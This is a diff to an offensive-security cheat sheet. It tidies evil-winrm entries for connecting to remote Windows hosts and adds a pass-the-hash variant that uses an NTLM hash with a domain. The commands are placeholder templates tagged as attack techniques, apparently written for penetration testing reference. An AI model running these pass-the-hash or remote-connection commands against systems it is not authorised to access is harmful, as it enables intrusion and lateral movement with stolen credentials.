@@ -52,14 +52,20 @@ Enter-PSSession -ComputerName <computername> -Credential <domain>\<username>
 gem install evil-winrm
 ```
 
-## evil-winrm use
-#plateform/linux  #target/remote #cat/ATTACK/CONNECT 
+## evil-winrm - connect with username and password
+#platform/linux  #target/remote #cat/ATTACK/CONNECT 
 ```
-evil-winrm -i <ip>/<domain> -u <user> -p <password>
+evil-winrm -i <target_ip> -u <user> -p <password>
 ```
 
-## evil-winrm use pass the hash
-#plateform/linux  #target/remote #cat/ATTACK/CONNECT 
+## evil-winrm - connect with username and NTLM hash
+#platform/linux  #target/remote #cat/ATTACK/CONNECT 
 ```
-evil-winrm -i <ip>/<domain> -u <user> -H <hash>
+evil-winrm -i <target_ip> -u <user> -H <hash>
+```
+
+## evil-winrm -connect with usersname and NTLM hash with domain
+#platform/linux  #target/remote #cat/ATTACK/CONNECT 
+```
+evil-winrm -i <target_ip>/<domain> -u <user> -H <hash>
 ```
